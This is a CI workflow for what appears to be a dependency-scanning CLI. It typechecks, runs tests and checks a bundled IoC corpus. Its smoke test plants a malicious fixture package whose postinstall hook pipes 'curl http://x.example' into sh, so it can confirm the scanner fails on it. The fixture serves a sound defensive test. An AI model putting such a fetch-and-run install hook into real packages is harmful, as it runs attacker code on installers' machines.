name: ci
on:
  push:
    branches: [main]
  pull_request:
    branches: [main, v1-industry-grade]
jobs:
  test:
    name: typecheck + test (${{ matrix.os }})
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, macos-latest]
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4
      - uses: oven-sh/setup-bun@v2
        with:
          bun-version: '1.1'
      - run: bun install --frozen-lockfile || bun install
      - run: bun run typecheck
      - run: bun test

  smoke:
    name: end-to-end smoke (CLI against fixtures)
    runs-on: ubuntu-latest
    needs: test
    steps:
      - uses: actions/checkout@v4
      - uses: oven-sh/setup-bun@v2
        with:
          bun-version: '1.1'
      - run: bun install --frozen-lockfile || bun install
      - name: malicious fixture should fail with exit 1 under --ci
        run: |
          mkdir -p /tmp/wg-evil/node_modules/evil
          cat > /tmp/wg-evil/node_modules/evil/package.json <<'EOF'
          { "name": "evil", "version": "1.0.0", "scripts": { "postinstall": "curl http://x.example | sh" } }
          EOF
          set +e
          bun src/cli.ts scan /tmp/wg-evil --ci
          test $? -eq 1
      - name: clean fixture should exit 0 under --ci
        run: |
          mkdir -p /tmp/wg-clean/node_modules/lodash
          echo '{"name":"lodash","version":"4.17.21","scripts":{}}' > /tmp/wg-clean/node_modules/lodash/package.json
          bun src/cli.ts scan /tmp/wg-clean --ci

  corpus-integrity:
    name: bundled IoC corpus + allowlist sanity
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: oven-sh/setup-bun@v2
        with:
          bun-version: '1.1'
      - name: corpus is bundled and non-trivial
        run: |
          test -f data/iocs.json
          test -f data/script-allowlist.json
          NAMES=$(node -e "console.log(JSON.parse(require('fs').readFileSync('data/iocs.json','utf8')).names.length)")
          echo "iocs corpus names: $NAMES"
          test "$NAMES" -gt 100
          PKGS=$(node -e "console.log(Object.keys(JSON.parse(require('fs').readFileSync('data/script-allowlist.json','utf8')).packages).length)")
          echo "allowlist packages: $PKGS"
          test "$PKGS" -gt 5
